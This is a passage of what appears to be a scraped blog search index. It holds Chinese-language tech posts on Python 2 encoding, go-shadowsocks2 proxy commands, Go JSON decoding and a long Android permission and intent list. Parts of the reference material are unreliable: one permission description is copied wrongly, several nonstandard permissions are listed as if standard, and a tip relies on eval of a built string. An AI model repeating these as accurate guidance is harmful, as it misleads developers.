[a.decode('g')]\n\n这里a为utf8编码，decode方法将utf8解码为unicode编码\n输出结果：\n\n中文\n[u'\\u4e2d\\u6587']\n\n由于控制台能识别unicode编码，所以需要把字符串放在列表里面才能看到unicode源码\n\nencoding=utf-8\na = '中文'\nprint [a.decode('gbk')]\n\n因为a是utf8编码的，如果将a用gbk解码，程序就会报错\n\nUnicodeDecodeError: 'gbk' codec can't decode bytes in position 2-3: illegal multibyte sequence\n\na = '中文'\nprint a.decode('utf-16')\n\n如果用utf-16解码方法解码utf-8的字符串，程序并不会报错（可能因为它们的编码方式相似），但是返回的是乱码：\n\n룤螖\n\n如果一个字符串为unicode码，又没有u标识，可以这样来转换成中文\n\na='\\u8054\\u76df\\u533a'\nb=\"u'%s'\"%a\n\nprint eval(b)\n\n后记\n\n1.如果想知道一个字符串是什么编码，可以print [字符串] 来看二进制码\n\n[u'\\u76ee\\u6807\\u533a\\u670d']\n['\\xe7\\x9b\\xae\\xe6\\xa0\\x87\\xe5\\x8c\\xba\\xe6\\x9c\\x8d']\n\n第一个是unicode，第二个是utf-8\n\n分类: Python\n好文要顶 关注我 收藏该文\nXjng\n关注 - 3\n粉丝 - 33\n+加关注\n0\n0\n« 上一篇：安装saltstack\n» 下一篇：python使用psutil获取服务器信息\nposted @ 2014-06-26 11:59 Xjng 阅读(5845) 评论(0) 编辑 收藏","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 go-shadowsocks2","title":"Linux命令 go-shadowsocks2","text":"socks代理\ngo-shadowsocks2 -s ss://AEADCHACHA20POLY1305:base64password@:8488 -verbose\ngo-shadowsocks2 -c ss://AEADCHACHA20POLY1305:base64password@xx.xx.xx.xx:8488 -verbose -socks :1088\n\n 2. socks代理实现tcptun 正向代理\niperf3 -s\n go-shadowsocks2 -s ss://AEADCHACHA20POLY1305:base64password@:8488 -verbose\n\n-tcptun client端:localport]=[server端:[remoteport]\ngo-shadowsocks2 -c ss://AEADCHACHA20POLY1305:password=@xx.xx.xx.xx:8488 -verbose -socks :1088 -tcptun :1090=localhost:5201\n\niperf3 -c 127.0.0.1 -p 1090  \n\n本机:1090--  服务器:8488 -    服务器.localhost:5201\n\n Server\n\nStart a server listening on port 8488 using AEADCHACHA20POLY1305 AEAD cipher with password your-password.\n\ngo-shadowsocks2 -s ss://AEADCHACHA20POLY1305:your-password@:8488 -verbose\n\nClient\n\nStart a client connecting to the above server. The client listens on port 1080 for incoming SOCKS5\nconnections, and tunnels both UDP and TCP on port 8053 and port 8054 to 8.8.8.8:53 and 8.8.4.4:53\nrespectively.\n\ngo-shadowsocks2 -c ss://AEADCHACHA20POLY1305:your-password@[serveraddress]:8488 \\\n     -verbose -socks :1080 -udptun :8053=8.8.8.8:53,:8054=8.8.4.4:53 \\\n                           -tcptun :8053=8.8.8.8:53,:8054=8.8.4.4:53\n\nReplace [serveraddress] with the server's public address.\n\n Advanced Usage\n\nUse random keys instead of passwords\n\nA random key is almost always better than a password. Generate a base64url-encoded 16-byte random key\n\ngo-shadowsocks2 -keygen 16\n\nStart a server listening on port 8848 using AEADAES128GCM AEAD cipher with the key generated above.\n\ngo-shadowsocks2 -s :8488 -cipher AEADAES128GCM -key k5yEIX5ciUDpkpdtvZm7zQ== -verbose\n\nAnd the corresponding client to connect to it.\n\ngo-shadowsocks2 -c [serveraddress]:8488 -cipher AEADAES128GCM -key k5yEIX5ciUDpkpdtvZm7zQ== -verbose\n\n Netfilter TCP redirect (Linux only)\n\nThe client offers -redir and -redir6 (for IPv6) options to handle TCP connections\nredirected by Netfilter on Linux. The feature works similar to ss-redir from shadowsocks-libev.\n\nStart a client listening on port 1082 for redirected TCP connections and port 1083 for redirected\nTCP IPv6 connections.\n\ngo-shadowsocks2 -c [serveraddress]:8488 -cipher AEADAES128GCM -key k5yEIX5ciUDpkpdtvZm7zQ== \\\n    -redir :1082 -redir6 :1083\n\nTCP tunneling\n\nThe client offers -tcptun [localaddr]:[localport]=[remoteaddr]:[remoteport] option to tunnel TCP.\nFor example it can be used to proxy iperf3 for benchmarking.\n\nStart iperf3 on the same machine with the server.\n\niperf3 -s\n\nBy default iperf3 listens on port 5201.\n\nStart a client on the same machine with the server. The client listens on port 1090 for incoming connections\nand tunnels to localhost:5201 where iperf3 is listening.\n\ngo-shadowsocks2 -c [serveraddress]:8488 -cipher AEADAES128GCM -key k5yEIX5ciUDpkpdtvZm7zQ== \\\n    -tcptun :1090=localhost:5201\n\nStart iperf3 client to connect to the tunneld port instead\n\niperf3 -c localhost -p 1090\n`","tags":null},{"location":"//blog.pytool.com/Post/Go/2016-10-04 golang json","title":"golang json","text":"1. Decode 和 Unmarshal 区别\n如果对Read的I/O性能比较敏感，可以考虑先把数据读出到[]byte再解析；如果对内存占用比较敏感，就直接使用decoder接口。\n具体的要根据你的应用的需求和你的数据的规模而定。如果没有特别的需求，就直接用decoder简洁的写法就可以。\n用json.Encoder会有一个全局的缓存池给不同的Encoder复用。如果要解析大量的json的话用json.Encoder或许会更好。\ndata, err := ioutil.ReadAll(resp.Body)\nif err == nil \u0026\u0026 data != nil {\n    err = json.Unmarshal(data, value)\n}\nor using json.NewDecoder.Decode\n\nerr = json.NewDecoder(resp.Body).Decode(value)\n\nIt really depends on what your input is. If you look at the implementation of the Decode method of json.Decoder, it buffers the entire JSON value in memory before unmarshalling it into a Go value. So in most cases it won't be any more memory efficient (although this could easily change in a future version of the language).\n\nSo a better rule of thumb is this:\n\n    Use json.Decoder if your data is coming from an io.Reader stream, or you need to decode multiple values from a stream of data.\n    Use json.Unmarshal if you already have the JSON data in memory.\n\nFor the case of reading from an HTTP request, I'd pick json.Decoder since you're obviously reading from a stream.\n\n json tags\n{\n  \"web\": \":50052\",\n  \"rpc\":\":50051\",\n  \"cpu\":  \"1\",\n  \"cache\": [{\"host\": \"192.168.0.2\", \"port\": 3000},{\"host\": \"192.168.0.1\", \"port\": 3000}],\n  \"ns\" : \"visitor\",\n}\n\ntype Config struct {\n\tCpu    int    json:\"cpu,string\"   // 结构体中是int 但是json中是string类型\n\tWeb    string json:\"web\"          // 绑定json字段\n\tRpc    string json:\"-\"            // 忽略字段解析 双向\n\tNs     string                       // 等价 json:\"ns\"\n\tSet    string  \n\tCache  []ServerCache json:\"caches,omitempty\" //有就解析没有就不解析\n\tLogger GrayLog\n}\nc := new(Config)\nfile, _ := os.Open(\"conf.json\")\nerr = json.NewDecoder(file).Decode(\u0026c)\n`","tags":null},{"location":"//blog.pytool.com/Post/Android 应用/2016-01-12 Android应用 权限管理","title":"Android权限管理","text":"网络上不乏android权限列表，但是很少有将列表和使用方法放在一起的，所以特此总结一下\n\n需要在AndroidManifest.xml中定义相应的权限（以获取internet访问权限为例），如下：\n\n   uses-permission   android:name =”android.permission.INTERNET”  /   \n\n注意在application也可以定义INTERNET权限，如下：\n\n   application   android:permission =”android.permission.INTERNET”    \n\n获取错略位置\nandroid.permission.ACCESSCOARSELOCATION\n通过WiFi或移动基站的方式获取用户错略的经纬度信息，定位精度大概误差在30~1500米\n获取精确位置\nandroid.permission.ACCESSFINELOCATION\n通过GPS芯片接收卫星的定位信息，定位精度达10米以内\n访问定位额外命令\nandroid.permission.ACCESSLOCATIONEXTRACOMMANDS\n允许程序访问额外的定位提供者指令\n获取模拟定位信息\nandroid.permission.ACCESSMOCKLOCATION\n获取模拟定位信息，一般用于帮助开发者调试应用\n获取网络状态\nandroid.permission.ACCESSNETWORKSTATE\n获取网络信息状态，如当前的网络连接是否有效\n访问Surface Flinger\nandroid.permission.ACCESSSURFACEFLINGER\nAndroid平台上底层的图形显示支持，一般用于游戏或照相机预览界面和底层模式的屏幕截图\n7. 获取WiFi状态\nandroid.permission.ACCESSWIFISTATE\n获取当前WiFi接入的状态以及WLAN热点的信息\n账户管理\nandroid.permission.ACCOUNTMANAGER\n获取账户验证信息，主要为GMail账户信息，只有系统级进程才能访问的权限\n验证账户\nandroid.permission.AUTHENTICATEACCOUNTS\n允许一个程序通过账户验证方式访问账户管理ACCOUNTMANAGER相关信息\n10. 电量统计\nandroid.permission.BATTERYSTATS\n获取电池电量统计信息\n11. 绑定小插件\nandroid.permission.BINDAPPWIDGET\n允许一个程序告诉appWidget服务需要访问小插件的数据库，只有非常少的应用才用到此权限\n12. 绑定设备管理\nandroid.permission.BINDDEVICEADMIN\n请求系统管理员接收者receiver，只有系统才能使用\n13. 绑定输入法\nandroid.permission.BINDINPUTMETHOD\n请求InputMethodService服务，只有系统才能使用\n14. 绑定RemoteView\nandroid.permission.BINDREMOTEVIEWS\n必须通过RemoteViewsService服务来请求，只有系统才能用\n15. 绑定壁纸\nandroid.permission.BINDWALLPAPER\n必须通过WallpaperService服务来请求，只有系统才能用\n 16. 使用蓝牙\nandroid.permission.BLUETOOTH\n允许程序连接配对过的蓝牙设备\n17. 蓝牙管理\nandroid.permission.BLUETOOTHADMIN\n允许程序进行发现和配对新的蓝牙设备\n18. 变成砖头\nandroid.permission.BRICK\n能够禁用手机，非常危险，顾名思义就是让手机变成砖头\n19. 应用删除时广播\nandroid.permission.BROADCASTPACKAGEREMOVED\n当一个应用在删除时触发一个广播\n20. 收到短信时广播\nandroid.permission.BROADCASTSMS\n当收到短信时触发一个广播\n21. 连续广播\nandroid.permission.BROADCASTSTICKY\n允许一个程序收到广播后快速收到下一个广播\n22. WAP PUSH广播\nandroid.permission.BROADCASTWAPPUSH\nWAP PUSH服务收到后触发一个广播\n23. 拨打电话\nandroid.permission.CALLPHONE\n允许程序从非系统拨号器里输入电话号码\n 24. 通话权限\nandroid.permission.CALLPRIVILEGED\n允许程序拨打电话，替换系统的拨号器界面\n25. 拍照权限\nandroid.permission.CAMERA\n允许访问摄像头进行拍照\n26. 改变组件状态\nandroid.permission.CHANGECOMPONENTENABLEDSTATE\n改变组件是否启用状态\n27. 改变配置\nandroid.permission.CHANGECONFIGURATION\n允许当前应用改变配置，如定位\n 28. 改变网络状态\nandroid.permission.CHANGENETWORKSTATE\n改变网络状态如是否能联网\n29. 改变WiFi多播状态\nandroid.permission.CHANGEWIFIMULTICASTSTATE\n30.改变WiFi状态\nandroid.permission.CHANGEWIFISTATE\n31. 清除应用缓存\nandroid.permission.CLEARAPPCACHE\n 清除用户数据\nandroid.permission.CLEARAPPUSERDATA\n底层访问权限\n32. android.permission.CWJGROUP\n允许CWJ账户组访问底层信息\n手机优化大师扩展权限\n33. android.permission.CELLPHONEMASTEREX\n控制定位更新\nandroid.permission.CONTROLLOCATIONUPDATES\n34. 允许获得移动网络定位信息改变\n删除缓存文件\nandroid.permission.DELETECACHEFILES\n35. 允许应用删除缓存文件\n删除应用\nandroid.permission.DELETEPACKAGES\n36. 允许程序删除应用\n电源管理\nandroid.permission.DEVICEPOWER\n37. 允许访问底层电源管理\n应用诊断\nandroid.permission.DIAGNOSTIC\n38. 允许程序到RW到诊断资源\n禁用键盘锁\nandroid.permission.DISABLEKEYGUARD\n39. 允许程序禁用键盘锁\n转存系统信息\nandroid.permission.DUMP\n40. 允许程序获取系统dump信息从系统服务\n状态栏控制\nandroid.permission.EXPANDSTATUSBAR\n41. 允许程序扩展或收缩状态栏\n工厂测试模式\nandroid.permission.FACTORYTEST\n42. 允许程序运行工厂测试模式\n使用闪光灯\nandroid.permission.FLASHLIGHT\n43. 允许访问闪光灯\n强制后退\nandroid.permission.FORCEBACK\n44. 允许程序强制使用back后退按键，无论Activity是否在顶层\n访问账户Gmail列表\nandroid.permission.GETACCOUNTS\n45. 获取应用大小\nandroid.permission.GETPACKAGESIZE\n获取应用的文件大小\n46. 获取任务信息\nandroid.permission.GETTASKS\n允许程序获取当前或最近运行的应用\n47. 允许全局搜索\nandroid.permission.GLOBALSEARCH\n允许程序使用全局搜索功能\n48. 硬件测试\nandroid.permission.HARDWARETEST\n访问硬件辅助设备，用于硬件测试\n49. 注射事件\nandroid.permission.INJECTEVENTS\n允许访问本程序的底层事件，获取按键、轨迹球的事件流\n50. 安装定位提供\nandroid.permission.INSTALLLOCATIONPROVIDER\n安装应用程序\n51. android.permission.INSTALLPACKAGES\n允许程序安装应用\n内部系统窗口\n52. android.permission.INTERNALSYSTEMWINDOW\n允许程序打开内部窗口，不对第三方应用程序开放此权限\n访问网络\n53. android.permission.INTERNET\n访问网络连接，可能产生GPRS流量\n结束后台进程\n54. android.permission.KILLBACKGROUNDPROCESSES\n允许程序调用killBackgroundProcesses(String).方法结束后台进程\n管理账户\n55. android.permission.MANAGEACCOUNTS，允许程序管理AccountManager中的账户列表\n管理程序引用\nandroid.permission.MANAGEAPPTOKENS，管理创建、摧毁、Z轴顺序，仅用于系统\n56. 高级权限\nandroid.permission.MTWEAKUSER\n允许mTweak用户访问高级系统权限\n57. 社区权限\nandroid.permission.MTWEAKFORUM\n允许使用mTweak社区权限\n58. 软格式化\nandroid.permission.MASTERCLEAR\n允许程序执行软格式化，删除系统配置信息\n59. 修改声音设置\nandroid.permission.MODIFYAUDIOSETTINGS\n修改声音设置信息\n60. 修改电话状态\nandroid.permission.MODIFYPHONESTATE\n修改电话状态，如飞行模式，但不包含替换系统拨号器界面\n61. 格式化文件系统\nandroid.permission.MOUNTFORMATFILESYSTEMS\n格式化可移动文件系统，比如格式化清空SD卡\n62. 挂载文件系统\nandroid.permission.MOUNTUNMOUNTFILESYSTEMS\n挂载、反挂载外部文件系统\n63. 允许NFC通讯\nandroid.permission.NFC\n允许程序执行NFC近距离通讯操作，用于移动支持\n64. 永久Activity\nandroid.permission.PERSISTENTACTIVITY\n创建一个永久的Activity，该功能标记为将来将被移除\n65. 处理拨出电话\nandroid.permission.PROCESSOUTGOINGCALLS\n允许程序监视，修改或放弃播出电话\n66. 读取日程提醒\nandroid.permission.READCALENDAR\n允许程序读取用户的日程信息\n67. 读取联系人\nandroid.permission.READCONTACTS\n允许应用访问联系人通讯录信息\n68. 屏幕截图\nandroid.permission.READFRAMEBUFFER\n读取帧缓存用于屏幕截图\n69. 读取收藏夹和历史记录\ncom.android.browser.permission.READHISTORYBOOKMARKS\n读取浏览器收藏夹和历史记录\n70. 读取输入状态\nandroid.permission.READINPUTSTATE\n读取当前键的输入状态，仅用于系统\n71. 读取系统日志\nandroid.permission.READLOGS\n读取系统底层日志\n72. 读取电话状态\nandroid.permission.READPHONESTATE，访问电话状态\n读取短信内容\n73. android.permission.READSMS\n读取同步设置\nandroid.permission.READSYNCSETTINGS\n74. 读取同步设置，读取Google在线同步设置\n读取同步状态\nandroid.permission.READSYNCSTATS\n75. 读取同步状态，获得Google在线同步状态\n重启设备\nandroid.permission.REBOOT\n76. 允许程序重新启动设备\n开机自动允许\nandroid.permission.RECEIVEBOOTCOMPLETED\n77. 允许程序开机自动运行\n接收彩信\nandroid.permission.RECEIVEMMS\n78. 接收短信\nandroid.permission.RECEIVESMS\n接收Wap Push\n79. android.permission.RECEIVEWAPPUSH\n录音\nandroid.permission.RECORDAUDIO\n80. 录制声音通过手机或耳机的麦克\n排序系统任务\nandroid.permission.REORDERTASKS\n81. 重新排序系统Z轴运行中的任务\n结束系统任务\nandroid.permission.RESTARTPACKAGES\n82. 结束任务通过restartPackage(String)方法，该方式将在外来放弃\n发送短信\nandroid.permission.SENDSMS\n83. 设置Activity观察其\nandroid.permission.SETACTIVITYWATCHER\n设置Activity观察器一般用于monkey测试\n84. 设置闹铃提醒\ncom.android.alarm.permission.SETALARM\n设置总是退出\n85. android.permission.SETALWAYSFINISH\n设置程序在后台是否总是退出\n设置动画缩放\n86. android.permission.SETANIMATIONSCALE\n设置全局动画缩放\n设置调试程序\n87. android.permission.SETDEBUGAPP\n设置调试程序，一般用于开发\n设置屏幕方向\n88. android.permission.SETORIENTATION\n设置屏幕方向为横屏或标准方式显示，不用于普通应用\n设置应用参数\n89. android.permission.SETPREFERREDAPPLICATIONS\n设置应用的参数，已不再工作具体查看addPackageToPreferred(String) 介绍\n设置进程限制\n90. android.permission.SETPROCESSLIMIT\n允许程序设置最大的进程数量的限制\n设置系统时间\n91. android.permission.SETTIME\n设置系统时区\nandroid.permission.SETTIMEZONE\n92. 设置桌面壁纸\nandroid.permission.SETWALLPAPER\n设置壁纸建议\n93. android.permission.SETWALLPAPERHINTS\n发送永久进程信号\nandroid.permission.SIGNALPERSISTENTPROCESSES\n94. 状态栏控制\nandroid.permission.STATUSBAR\n允许程序打开、关闭、禁用状态栏\n95. 访问订阅内容\nandroid.permission.SUBSCRIBEDFEEDSREAD\n访问订阅信息的数据库\n96. 写入订阅内容\nandroid.permission.SUBSCRIBEDFEEDSWRITE\n写入或修改订阅内容的数据库\n97. 显示系统窗口\nandroid.permission.SYSTEMALERTWINDOW\n更新设备状态\n98. android.permission.UPDATEDEVICESTATS\n使用证书\nandroid.permission.USECREDENTIALS\n99. 允许程序请求验证从AccountManager\n使用SIP视频\nandroid.permission.USESIP\n100. 允许程序使用SIP视频服务\n使用振动\nandroid.permission.VIBRATE\n101. 唤醒锁定\nandroid.permission.WAKELOCK\n允许程序在手机屏幕关闭后后台进程仍然运行\n102. 写入GPRS接入点设置\nandroid.permission.WRITEAPNSETTINGS\n写入网络GPRS接入点设置\n103. 写入日程提醒\nandroid.permission.WRITECALENDAR\n写入日程，但不可读取\n104. 写入联系人\nandroid.permission.WRITECONTACTS\n写入联系人，但不可读取\n105. 写入外部存储\nandroid.permission.WRITEEXTERNALSTORAGE\n允许程序写入外部存储，如SD卡上写文件\n106. 写入Google地图数据\nandroid.permission.WRITEGSERVICES\n允许程序写入Google Map服务数据\n107. 写入收藏夹和历史记录\ncom.android.browser.permission.WRITEHISTORYBOOKMARKS\n写入浏览器历史记录或收藏夹，但不可读取\n108. 读写系统敏感设置\nandroid.permission.WRITESECURESETTINGS\n允许程序读写系统安全敏感的设置项\n109. 读写系统设置\nandroid.permission.WRITESETTINGS\n允许读写系统设置项\n110. 编写短信\nandroid.permission.WRITESMS\n111. 写入在线同步设置\nandroid.permission.WRITESYNCSETTINGS\n写入Google在线同步设置\n#####################\n　　我们看到Android平台上的权限许可分得还是很细，和Symbian S60 3rd的Capabilities比详细的多，如果软件无法正常执行时看看是不是缺少相关的permission声明，最终我们还需要使用android sign tools签名生成的apk文件。\n\n  public static final String BROADCASTPACKAGEREMOVED\n\n　　允许应用程序发出一个应用程序被删除的通知。\n\n　　常量值： \"android.permission.BROADCASTPACKAGEREMOVED\"\n\n　　public static final String CALLPHONE\n\n　　允许应用程序发起一个电话呼叫而不需要经拨号器用户界面确认。\n\n　　常量值： \"android.permission.CALLPHONE\"\n\n　　public static final String DUMP\n\n　　允许应用程序从系统服务获取状态存储信息。\n\n　　常量值： \"android.permission.DUMP\"\n\n　　public static final String FOTAUPDATE\n\n　　常量值： \"android.permission.FOTAUPDATE\"\n\n　　public static final String GETTASKS\n\n　　允许应用程序获得当前运行任务的信息：任务的简短描述，运行着什么 activity等。\n\n　　常量值： \"android.permission.GETTASKS\"\n\n　　public static final String INSTALLPACKAGES\n\n　　允许应用程序安装包。\n\n　　常量值： \"android.permission.INSTALLPACKAGES\"\n\n　　public static final String INTERNALSYSTEMWINDOW\n\n　　允许应用程序打开作为系统用户界面的一部分的窗口。\n\n　　常量值： \"android.permission.INTERNALSYSTEMWINDOW\"\n\n　　public static final String RAISEDTHREADPRIORITY\n\n　　允许应用程序获取提升的线程优先级，例如实时音频重放。\n\n　　常量值： \"android.permission.RAISEDTHREADPRIORITY\"\n\n　　public static final String READCONTACTS\n\n　　允许应用程序当前用户的通讯录数据。\n\n　　常量值： \"android.permission.READCONTACTS\"\n\n　　public static final String RECEIVESMS\n\n　　允许应用程序监听收到的短信，并对短信进行记录或执行操作。\n\n　　常量值： \"android.permission.RECEIVESMS\"\n\n　　public static final String RECEIVEWAPPUSH\n\n　　允许应用程序监听提过WAP push进来的信息。\n\n　　常量值： \"android.permission.RECEIVEWAPPUSH\"\n\n　　public static final String RUNINSTRUMENTATION\n\n　　允许应用程序开始运行某个包。\n\n　　常量值： \"android.permission.RUNINSTRUMENTATION\"\n\n　　public static final String SETACTIVITYWATCHER\n\n允许应用程序监视和控制Activity如何在系统中启动。尽在调试状态(通常是 monkey命令)下可用。\n\n　　常量值： \"android.permission.SETACTIVITYWATCHER\"\n\n　　public static final String SIGNALPERSISTENTPROCESSES\n\n　　允许应用程序请求一个发给所有固有进程的信号。\n\n　　常量值： \"android.permission.SIGNALPERSISTENTPROCESSES\"\n\n　　public static final String SYSTEMALERTWINDOW\n\n　　允许应用程序使用SYSTEMALERTTYPE类型在所有其他应用程序之上显示窗口很少有程序用到这个许可;这些窗口与用户进行系统级的交互。\n\n　　常量值： \"android.permission.SYSTEMALERTWINDOW\"\n\n　　public static final String WRITECONTACTS\n\n　　允许应用程序写入(不能读取)用户的通讯录数据。\n\n　　常量值： \"android.permission.WRITECONTACTS\"\n\n　　public static final String WRITESETTINGS\n\n　　允许应用程序读写用户的通讯录数据。\n\n　　常量值： \"android.permission.WRITESETTINGS\"\n\n　　构造函数\n\n　　public Manifest.permission()\n\n　　String ADDSHORTCUTACTION 动作：在系统中添加一个快捷方式。. \"android.intent.action.ADDSHORTCUT\"\n\n　　String ALLAPPSACTION 动作：列举所有可用的应用。\n\n　　输入：无。 \"android.intent.action.ALLAPPS\"\n\n　　String ALTERNATIVECATEGORY 类别：说明 activity 是用户正在浏览的数据的一个可选操作。 \"android.intent.category.ALTERNATIVE\"\n\n　　String ANSWERACTION 动作：处理拨入的电话。 \"android.intent.action.ANSWER\"\n\n　　String BATTERYCHANGEDACTION 广播：充电状态，或者电池的电量发生变化。 \"android.intent.action.BATTERYCHANGED\"\n\n　　String BOOTCOMPLETEDACTION 广播：在系统启动后，这个动作被广播一次(只有一次)。 \"android.intent.action.BOOTCOMPLETED\"\n\n　　String BROWSABLECATEGORY 类别：能够被浏览器安全使用的 activities 必须支持这个类别。 \"android.intent.category.BROWSABLE\"\n\n　　String BUGREPORTACTION 动作：显示 activity 报告错误。 \"android.intent.action.BUGREPORT\"\n\n　　String CALLACTION 动作：拨打电话，被呼叫的联系人在数据中指定。 \"android.intent.action.CALL\"\n\nString CALLFORWARDINGSTATECHANGEDACTION 广播：语音电话的呼叫转移状态已经改变。 \"android.intent.action.CFF\"\n\n　　String CLEARCREDENTIALSACTION 动作：清除登陆凭证 (credential)。 \"android.intent.action.CLEARCREDENTIALS\"\n\n　　String CONFIGURATIONCHANGEDACTION 广播：设备的配置信息已经改变，参见 Resources.Configuration. \"android.intent.action.CONFIGURATIONCHANGED\"\n\n　　Creator CREATOR 无 无\n\n　　String DATAACTIVITYSTATECHANGEDACTION 广播：电话的数据活动(data activity)状态(即收发数据的状态)已经改变。 \"android.intent.action.DATAACTIVITY\"\n\n　　String DATACONNECTIONSTATECHANGEDACTION 广播：电话的数据连接状态已经改变。 \"android.intent.action.DATASTATE\"\n\n　　String DATECHANGEDACTION 广播：日期被改变。 \"android.intent.action.DATECHANGED\"\n\n　　String DEFAULTACTION 动作：和 VIEWACTION 相同，是在数据上执行的标准动作。 \"android.intent.action.VIEW\"\n\n　　String DEFAULTCATEGORY 类别：如果 activity 是对数据执行确省动作(点击, center press)的一个选项，需要设置这个类别。 \"android.intent.category.DEFAULT\"\n\n　　String DELETEACTION 动作：从容器中删除给定的数据。 \"android.intent.action.DELETE\"\n\n　　String DEVELOPMENTPREFERENCECATEGORY 类别：说明 activity 是一个设置面板 (development preference panel). \"android.intent.category.DEVELOPMENTPREFERENCE\"\n\n　　String DIALACTION 动作：拨打数据中指定的电话号码。 \"android.intent.action.DIAL\"\n\n　　String EDITACTION 动作：为制定的数据显示可编辑界面。 \"android.intent.action.EDIT\"\n\n　　String EMBEDCATEGORY 类别：能够在上级(父)activity 中运行。 \"android.intent.category.EMBED\"\n\n　　String EMERGENCYDIALACTION 动作：拨打紧急电话号码。 \"android.intent.action.EMERGENCYDIAL\"\n\n　　int FORWARDRESULTLAUNCH 启动标记：如果这个标记被设置，而且被一个已经存在的 activity 用来启动新的 activity，已有 activity 的回复目标 (reply target) 会被转移给新的 activity。 16 0x00000010\n\n　　String FOTACANCELACTION 广播：取消所有被挂起的 (pending) 更新下载。\n\n\"android.server.checkin.FOTACANCEL\"\n\n　　String FOTAINSTALLACTION 广播：更新已经被确认，马上就要开始安装。 \"android.server.checkin.FOTAINSTALL\"\n\n　　String FOTAREADYACTION 广播：更新已经被下载，可以开始安装。 \"android.server.checkin.FOTAREADY\"\n\n　　String FOTARESTARTACTION 广播：恢复已经停止的更新下载。 \"android.server.checkin.FOTARESTART\"\n\n　　String FOTAUPDATEACTION 广播：通过 OTA 下载并安装操作系统更新。 \"android.server.checkin.FOTAUPDATE\"\n\n　　String FRAMEWORKINSTRUMENTATIONTESTCATEGORY 类别：To be used as code under test for framework instrumentation tests. \"android.intent.category.FRAMEWORKINSTRUMENTATIONTEST\"\n\n　　String GADGETCATEGORY 类别：这个 activity 可以被嵌入宿主 activity (activity that is hosting gadgets)。 \"android.intent.category.GADGET\"\n\n　　String GETCONTENTACTION 动作：让用户选择数据并返回。 \"android.intent.action.GETCONTENT\"\n\n　　String HOMECATEGORY 类别：主屏幕 (activity)，设备启动后显示的第一个 activity。 \"android.intent.category.HOME\"\n\n　　String INSERTACTION 动作：在容器中插入一个空项 (item)。 \"android.intent.action.INSERT\"\n\n　　String INTENTEXTRA 附加数据：和 PICKACTIVITYACTION 一起使用时，说明用户选择的用来显示的 activity;和 ADDSHORTCUTACTION 一起使用的时候，描述要添加的快捷方式。 \"android.intent.extra.INTENT\"\n\n　　String LABELEXTRA 附加数据：大写字母开头的字符标签，和 ADDSHORTCUTACTION 一起使用。 \"android.intent.extra.LABEL\"\n\n　　String LAUNCHERCATEGORY 类别：Activity 应该被显示在顶级的 launcher 中。 \"android.intent.category.LAUNCHER\"\n\n　　String LOGINACTION 动作：获取登录凭证。 \"android.intent.action.LOGIN\"\n\n　　String MAINACTION 动作：作为主入口点启动，不需要数据。 \"android.intent.action.MAIN\"\n\n　　String MEDIABUTTONACTION 广播：用户按下了“Media Button”。 \"android.intent.action.MEDIABUTTON\"\n\n　　String MEDIABADREMOVALACTION 广播：扩展介质(扩展卡)已经从 SD 卡插槽拔出，但是挂载点 (mount\n\npoint) 还没解除 (unmount)。 \"android.intent.action.MEDIABADREMOVAL\"\n\n　　String MEDIAEJECTACTION 广播：用户想要移除扩展介质(拔掉扩展卡)。 \"android.intent.action.MEDIAEJECT\"\n\n　　String MEDIAMOUNTEDACTION 广播：扩展介质被插入，而且已经被挂载。 \"android.intent.action.MEDIAMOUNTED\"\n\n　　String MEDIAREMOVEDACTION 广播：扩展介质被移除。 \"android.intent.action.MEDIAREMOVED\"\n\n　　String MEDIASCANNERFINISHEDACTION 广播：已经扫描完介质的一个目录。 \"android.intent.action.MEDIASCANNERFINISHED\"\n\n　　String MEDIASCANNERSTARTEDACTION 广播：开始扫描介质的一个目录。 \"android.intent.action.MEDIASCANNERSTARTED\"\n\n　　String MEDIASHAREDACTION 广播：扩展介质的挂载被解除 (unmount)，因为它已经作为 USB 大容量存储被共享。 \"android.intent.action.MEDIASHARED\"\n\n　　String MEDIAUNMOUNTEDACTION 广播：扩展介质存在，但是还没有被挂载 (mount)。 \"android.intent.action.MEDIAUNMOUNTED\"\n\n　　String MESSAGEWAITINGSTATECHANGEDACTION 广播：电话的消息等待(语音邮件)状态已经改变。 \"android.intent.action.MWI\"\n\n　　int MULTIPLETASKLAUNCH 启动标记：和 NEWTASKLAUNCH 联合使用，禁止将已有的任务改变为前景任务 (foreground)。 8 0x00000008\n\n　　String NETWORKTICKLERECEIVEDACTION 广播：设备收到了新的网络 \"tickle\" 通知。 \"android.intent.action.NETWORKTICKLERECEIVED\"\n\n　　int NEWTASKLAUNCH 启动标记：设置以后，activity 将成为历史堆栈中的第一个新任务(栈顶)。 4 0x00000004\n\n　　int NOHISTORYLAUNCH 启动标记：设置以后，新的 activity 不会被保存在历史堆栈中。 1 0x00000001\n\n　　String PACKAGEADDEDACTION 广播：设备上新安装了一个应用程序包。 \"android.intent.action.PACKAGEADDED\"\n\n　　String PACKAGEREMOVEDACTION 广播：设备上删除了一个应用程序包。 \"android.intent.action.PACKAGEREMOVED\"\n\n　　String PHONESTATECHANGEDACTION 广播：电话状态已经改变。 \"android.intent.action.PHONESTATE\"\n\n　　String PICKACTION 动作：从数据中选择一个项目 (item)，将被选中的项目返回。\n\n\"android.intent.action.PICK\"\n\n　　String PICKACTIVITYACTION 动作：选择一个 activity，返回被选择的 activity 的类(名)。 \"android.intent.action.PICKACTIVITY\"\n\n　　String PREFERENCECATEGORY 类别：activity是一个设置面板 (preference panel)。 \"android.intent.category.PREFERENCE\"\n\n　　String PROVIDERCHANGEDACTION 广播：更新将要(真正)被安装。 \"android.intent.action.PROVIDERCHANGED\"\n\n　　String PROVISIONINGCHECKACTION 广播：要求 polling of provisioning service 下载最新的设置。 \"android.intent.action.PROVISIONINGCHECK\"\n\n　　String RUNACTION 动作：运行数据(指定的应用)，无论它(应用)是什么。 \"android.intent.action.RUN\"\n\n　　String SAMPLECODECATEGORY 类别：To be used as an sample code example (not part of the normal user experience). \"android.intent.category.SAMPLECODE\"\n\n　　String SCREENOFFACTION 广播：屏幕被关闭。 \"android.intent.action.SCREENOFF\"\n\n　　String SCREENONACTION 广播：屏幕已经被打开。 \"android.intent.action.SCREENON\"\n\n　　String SELECTEDALTERNATIVECATEGORY 类别：对于被用户选中的数据，activity 是它的一个可选操作。 \"android.intent.category.SELECTEDALTERNATIVE\"\n\n　　String SENDTOACTION 动作：向 data 指定的接收者发送一个消息。 \"android.intent.action.SENDTO\"\n\n　　String SERVICESTATECHANGEDACTION 广播：电话服务的状态已经改变。 \"android.intent.action.SERVICESTATE\"\n\n　　String SETTINGSACTION 动作：显示系统设置。输入：无。 